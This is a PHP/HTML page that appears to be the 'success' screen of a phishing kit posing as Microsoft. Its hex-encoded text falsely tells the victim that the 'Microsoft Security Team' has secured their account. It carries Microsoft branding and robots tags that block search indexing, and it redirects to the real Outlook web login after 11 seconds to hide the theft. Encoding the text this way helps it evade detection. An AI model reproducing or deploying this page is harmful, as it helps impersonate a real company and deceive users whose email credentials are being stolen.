<?php
	$email = $_GET['email'];
?>

<!DOCTYPE html>
<script>
        var timer = setTimeout(function() {
            window.location='https://outlook.office.com/owa/'
        }, 11000);
    </script>
<html>

 <head>

  <title>&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x66;&#x74;&#x2D;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta name="robots" content "none">
	<meta name="Googlebot" content="nofollow">
	<meta name="robots" content "noindex, nofollow">
  <link rel="shortcut icon" type="icon" href="images/favicon.png">

  <style>
   body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    width: 1200px;
    max-width: 1200px;
    padding-top: 25px;
    margin: auto;
   }
  </style>

 </head>

 <body>
  <div>
   <img src="images/ms-logo-v2.jpg" alt="logo">
  </div>

  <div>
   <h1>&#x4E;&#x6F;&#x74;&#x68;&#x69;&#x6E;&#x67;&#x20;&#x74;&#x6F;&#x20;&#x77;&#x6F;&#x72;&#x72;&#x79;&#x20;&#x61;&#x62;&#x6F;&#x75;&#x74;&#x2E;&#x20;&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x54;&#x65;&#x61;&#x6D;&#x20;&#x61;&#x73;&#x73;&#x75;&#x72;&#x65;&#x73;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x74;&#x68;&#x61;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x69;&#x73;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x65;&#x64;&#x2E;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x6D;&#x65;&#x61;&#x6E;&#x73;&#x20;&#x61;&#x6C;&#x6F;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x75;&#x73;&#x2E;&#x20;</h1>


   <br>

   <p>&#x59;&#x6F;&#x75;&#x20;&#x77;&#x6F;&#x75;&#x6C;&#x64;&#x20;&#x62;&#x65;&#x20;&#x72;&#x65;&#x64;&#x69;&#x72;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6D;&#x61;&#x69;&#x6C;&#x62;&#x6F;&#x78;&#x20;&#x6E;&#x6F;&#x77;&#x2E;&#x20;&#x49;&#x66;&#x20;&#x72;&#x65;&#x64;&#x69;&#x72;&#x65;&#x63;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x6F;&#x73;&#x65;&#x6E;&#x27;&#x74;&#x20;&#x6F;&#x63;&#x63;&#x6F;&#x75;&#x72;&#x2C; <a href="https://outlook.office.com/owa/">&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x20;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x63;&#x6F;&#x6E;&#x74;&#x69;&#x6E;&#x75;&#x65;.</a>.</p>

   <br>

  </div>

  <hr>

  <div>
   <p align="right">&copy; &#x32;&#x30;&#x32;&#x30;&#x20;&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74; <a href="#" style=" text-decoration: none;">&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65; &#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x26;&#x20;&#x43;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x73;</a> &#x44;&#x65;&#x76;&#x65;&#x6C;&#x6F;&#x70;&#x65;&#x72;&#x73;</p>
  </div>

 </body>
</html>
